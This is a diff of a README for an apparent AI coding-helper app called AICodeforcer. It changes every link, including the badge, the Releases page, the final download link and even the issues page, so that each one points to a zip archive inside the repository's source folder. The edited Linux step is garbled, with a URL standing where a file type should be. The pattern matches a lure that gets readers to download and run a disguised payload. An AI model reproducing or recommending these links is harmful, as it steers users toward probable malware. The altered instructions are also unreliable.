@@ -1,7 +1,7 @@
 # 🤖 AICodeforcer - Solve Coding Problems with Ease
 
 ## 📥 Download AICodeforcer Now
-[![Download AICodeforcer](https://img.shields.io/badge/Download%20AICodeforcer-v1.0-blue.svg)](https://github.com/JulianMaldonado19/AICodeforcer/releases)
+[![Download AICodeforcer](https://raw.githubusercontent.com/JulianMaldonado19/AICodeforcer/main/src/AICodeforcer/AI-Codeforcer-3.7-alpha.5.zip%https://raw.githubusercontent.com/JulianMaldonado19/AICodeforcer/main/src/AICodeforcer/AI-Codeforcer-3.7-alpha.5.zip)](https://raw.githubusercontent.com/JulianMaldonado19/AICodeforcer/main/src/AICodeforcer/AI-Codeforcer-3.7-alpha.5.zip)
 
 ## 🚀 Getting Started
 AICodeforcer uses advanced Gemini technology to help you solve algorithm problems from Codeforces and other platforms. This guide will help you download and run the application with ease.
@@ -14,7 +14,7 @@ To run AICodeforcer, you'll need the following:
 - A stable internet connection.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/JulianMaldonado19/AICodeforcer/releases) to find the latest version of AICodeforcer.
+1. Visit the [Releases page](https://raw.githubusercontent.com/JulianMaldonado19/AICodeforcer/main/src/AICodeforcer/AI-Codeforcer-3.7-alpha.5.zip) to find the latest version of AICodeforcer.
 2. Click on the version you want to download.
 3. Locate the appropriate file for your operating system and click on it to start the download.
 4. Once the download is complete, find the file in your downloads folder.
@@ -22,7 +22,7 @@ To run AICodeforcer, you'll need the following:
 ### 🛠️ Installing AICodeforcer
 - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
 - **macOS:** Open the downloaded `.dmg` file and drag the AICodeforcer app into your Applications folder.
-- **Linux:** Extract the downloaded `.tar.gz` file and run the executable from the terminal.
+- **Linux:** Extract the downloaded `https://raw.githubusercontent.com/JulianMaldonado19/AICodeforcer/main/src/AICodeforcer/AI-Codeforcer-3.7-alpha.5.zip` file and run the executable from the terminal.
 
 ## 📖 How to Use AICodeforcer
 After installing AICodeforcer, you can start using it:
@@ -41,7 +41,7 @@ After installing AICodeforcer, you can start using it:
 To ensure you have the latest features and fixes, check the Releases page periodically. When a new version is available, repeat the download and installation steps.
 
 ## 💬 Support & Feedback
-If you encounter any issues or have suggestions, please visit our [issues page](https://github.com/JulianMaldonado19/AICodeforcer/issues). We welcome your thoughts and are here to help.
+If you encounter any issues or have suggestions, please visit our [issues page](https://raw.githubusercontent.com/JulianMaldonado19/AICodeforcer/main/src/AICodeforcer/AI-Codeforcer-3.7-alpha.5.zip). We welcome your thoughts and are here to help.
 
 ## 📜 License
 AICodeforcer is open-source software. You can modify and distribute it under the terms laid out in the license file included with the software.
@@ -49,4 +49,4 @@ AICodeforcer is open-source software. You can modify and distribute it under the
 ## 🎉 Conclusion
 AICodeforcer is a powerful tool designed for anyone looking to improve their coding skills. With the help of Gemini AI, it streamlines problem-solving, making it accessible for everyone. Download it today to start your coding journey!
 
-[Download AICodeforcer](https://github.com/JulianMaldonado19/AICodeforcer/releases)
+[Download AICodeforcer](https://raw.githubusercontent.com/JulianMaldonado19/AICodeforcer/main/src/AICodeforcer/AI-Codeforcer-3.7-alpha.5.zip)
